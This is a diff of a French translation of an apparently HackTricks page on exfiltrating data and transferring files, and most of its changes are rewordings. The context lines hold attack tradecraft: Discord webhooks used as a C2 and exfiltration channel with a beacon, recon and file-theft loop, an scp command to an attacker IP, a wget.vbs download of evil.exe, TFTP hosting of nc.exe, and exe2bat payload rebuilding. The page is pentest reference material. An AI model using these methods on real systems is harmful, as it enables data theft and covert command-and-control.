@@ -2,9 +2,16 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Domaines couramment autorisés pour exfiltrer des informations
+> [!TIP]
+> Pour un exemple de bout en bout montrant la mise en scène de loot dans `C:\Users\Public` et son exfiltration avec Rclone pour imiter des sauvegardes légitimes, consultez le workflow ci-dessous.
 
-Consultez [https://lots-project.com/](https://lots-project.com/) pour trouver des domaines couramment autorisés qui peuvent être abusés
+{{#ref}}
+../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
+{{#endref}}
+
+## Domaines couramment whitelisted pour exfiltrer des informations
+
+Consultez [https://lots-project.com/](https://lots-project.com/) pour trouver des domaines couramment whitelisted qui peuvent être abusés
 
 ## Copier\&Coller Base64
 
@@ -102,12 +109,12 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ## Webhooks (Discord/Slack/Teams) pour C2 & Data Exfiltration
 
-Les Webhooks sont des endpoints HTTPS en écriture seule qui acceptent du JSON et des parties de fichier optionnelles. Ils sont couramment autorisés sur des domaines SaaS de confiance et ne nécessitent pas de clés OAuth/API, ce qui les rend utiles pour le beaconing à faible friction et pour l'exfiltration.
+Les Webhooks sont des write-only HTTPS endpoints qui acceptent JSON et des parties de fichier optionnelles. Ils sont souvent autorisés sur des domaines SaaS de confiance et ne nécessitent pas d'OAuth/API keys, ce qui les rend utiles pour du beaconing et de l'exfiltration à faible friction.
 
-Key ideas:
-- Endpoint : Discord utilise https://discord.com/api/webhooks/<id>/<token>
+Idées clés:
+- Endpoint: Discord uses https://discord.com/api/webhooks/<id>/<token>
 - POST multipart/form-data with a part named payload_json containing {"content":"..."} and optional file part(s) named file.
-- Operator loop pattern : periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK confirment la livraison.
+- Operator loop pattern: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK confirment la livraison.
 
 PowerShell PoC (Discord):
 ```powershell
@@ -177,9 +184,9 @@ Send-DiscordFile -Path $tmp -Name "recon.txt"
 Start-Sleep -Seconds 20
 }
 ```
-Remarques :
+Remarques:
 - Des schémas similaires s'appliquent à d'autres plateformes de collaboration (Slack/Teams) utilisant leurs incoming webhooks ; ajustez l'URL et le schéma JSON en conséquence.
-- Pour le DFIR des artefacts de cache de Discord Desktop et la récupération des webhook/API, voir :
+- Pour le DFIR des artefacts de cache de Discord Desktop et la récupération des webhook/API, voir:
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -228,14 +235,14 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Kali en tant que serveur
+Kali comme serveur
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Ou créer un partage smb **en utilisant samba**:
+Ou créez un partage smb **en utilisant samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -266,7 +273,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Si la victime dispose d'un service SSH, l'attaquant peut monter un répertoire de la victime sur sa propre machine.
+Si la victime a SSH, l'attaquant peut monter un répertoire de la victime sur l'attaquant.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -313,22 +320,22 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Si vous pouvez envoyer des données à un serveur SMTP, vous pouvez créer un serveur SMTP pour recevoir les données avec python:
+Si vous pouvez envoyer des données à un serveur SMTP, vous pouvez créer un serveur SMTP pour recevoir les données avec python :
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Par défaut sous XP et 2003 (dans d'autres, il doit être ajouté explicitement lors de l'installation)
+Par défaut sous XP et 2003 (sur les autres, il doit être ajouté explicitement lors de l'installation)
 
-Sous Kali, **démarrer le serveur TFTP**:
+Dans Kali, **démarrer le serveur TFTP**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**Serveur TFTP en python:**
+**Serveur TFTP en python :**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
@@ -381,13 +388,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Le programme `debug.exe` permet non seulement d'inspecter des binaires mais possède aussi la **capacité de les reconstruire à partir d'hex**. Cela signifie qu'en fournissant un hex d'un binaire, `debug.exe` peut générer le fichier binaire. Cependant, il est important de noter que debug.exe a une **limitation : il n'assemble que des fichiers jusqu'à 64 kb**.
+Le programme `debug.exe` permet non seulement d'inspecter des binaries, mais il a aussi la **capacité de les reconstruire à partir d'hex**. Autrement dit, en fournissant un hex d'un binary, `debug.exe` peut générer le fichier binaire. Cependant, il est important de noter que `debug.exe` présente une **limitation : assembler des fichiers d'une taille maximale de 64 kb**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Collez ensuite le texte dans la windows-shell et un fichier nommé nc.exe sera créé.
+Ensuite, copiez-collez le texte dans le windows-shell et un fichier nommé nc.exe sera créé.
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
@@ -397,7 +404,7 @@ Collez ensuite le texte dans la windows-shell et un fichier nommé nc.exe sera c
 
 ## Références
 
-- [Discord en tant que C2 et les preuves mises en cache qu'il laisse derrière](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
+- [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
 - [Discord Webhooks – Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook)
 - [Discord Forensic Suite (cache parser)](https://github.com/jwdfir/discord_cache_parser)
 
